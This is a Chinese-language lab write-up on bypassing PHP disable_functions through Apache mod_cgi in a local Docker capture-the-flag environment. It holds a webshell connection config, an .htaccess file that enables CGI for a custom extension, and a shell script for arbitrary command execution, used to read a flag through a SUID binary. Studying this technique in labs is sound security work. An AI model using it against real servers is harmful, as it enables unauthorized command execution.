## 03 利用 Apache Mod CGI

### php.ini 配置如下:

```ini
disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv
```

> 相比 01 多了 `putenv`

### 使用条件

* Linux 操作系统
* Apache + PHP (apache 使用 apache_mod_php)
* Apache 开启了 `cgi`, `rewrite`
* Web 目录给了 `AllowOverride` 权限
* 当前目录可写

###  绕过实验

AntSword >= 2.1.4

我们的最终目的是获取 `/flag` 的内容, 这个文件是 644 权限，`www-data` 用户无法通过读文件的形式读到内容, 需要执行拥有 SUID 权限的 `tac` 命令(具体看 `/start.sh`)来获取 flag

1. 启动环境

```
$ docker-compose up -d
```

Shell | 密码
:-:|:-:
`http://127.0.0.1:18080/index.php` | ant
`http://127.0.0.1:18080/shell.php` | ant

2. 打开 AntSword 添加 Shell

![1.png](https://i.loli.net/2019/07/08/5d221a74179c434216.png)

也可直接使用配置导入插件导入下面的配置:

```
{"_id":"NKonQAcRd5DAIcRj","addr":"IANA 保留地址用于本地回送","category":"default","ctime":1562515402313,"decoder":"default","encode":"UTF8","encoder":"base64","httpConf":{"body":{},"headers":{"User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/5.4.1 NetType/WIFI"}},"ip":"127.0.0.1","note":"AntSword-Labs Bypass disable functions 2","otherConf":{"chunk-step-byte-max":"3","chunk-step-byte-min":"2","command-path":"","filemanager-cache":1,"ignore-https":1,"request-timeout":"30000","terminal-cache":0,"upload-fragment":"500","use-chunk":0,"use-multipart":0},"pwd":"ant","type":"php","url":"http://127.0.0.1:18080/index.php","utime":1562515402313}
```

3. 使用「绕过 disable_functions」插件, 选择 `Apache_mod_cgi` 模式进行

![](https://i.loli.net/2019/07/15/5d2c2cc4cf24187911.png)

> 注意: 刚点进来的时候, 左侧状态栏处都是 NO

4. 点击「开始」按钮后，成功之后, 会创建一个新的「虚拟终端」

![](https://i.loli.net/2019/07/15/5d2c2ccd7278d84797.png)

5. 尝试执行命令, 成功

![](https://i.loli.net/2019/07/15/5d2c3043519ac32840.png)

**注意1:**

注意看上图中进程树的情况

如果执行命令直接使用 `system` 等执行命令的函数, 进程列表是这样的:

```
www-data   810   684  0 Jul06 ?        00:00:14 /usr/sbin/apache2 -k start
www-data   909   712  0 00:17 ?        00:00:00 sh -c /bin/sh -c "cd "/var/www/html";ps -aef;echo [S];pwd;echo [E]" 2>&1
www-data   910   909  0 00:17 ?        00:00:00 /bin/sh -c cd /var/www/html;ps -aef;echo [S];pwd;echo [E]
www-data   911   910  0 00:17 ?        00:00:00 ps -aef
```

可以明显看出本例中执行命令时, 利用了CGI,我们将命令写入到 `shell.ant` 文件中, 达到执行任意命令的目的

因为是访问了 CGI, 如果命令执行不成功, 页面是会直接报 500 错误, 不会在虚拟终端下显示出来(见: `cat /flag`)

然后我们改用 tac 命令来获取 flag 即可

#### 手动

新建 `.htaccess` 文件:

```
Options +ExecCGI
AddHandler cgi-script .ant
```

然后新建 `shell.ant` 文件

```bash
#!/bin/sh
echo&&cd "/var/www/html";ls -al;echo [S];pwd;echo [E]
```

最后访问 `shell.ant` 文件即可

![4.png](https://i.loli.net/2019/07/15/5d2c31889223c15126.png)
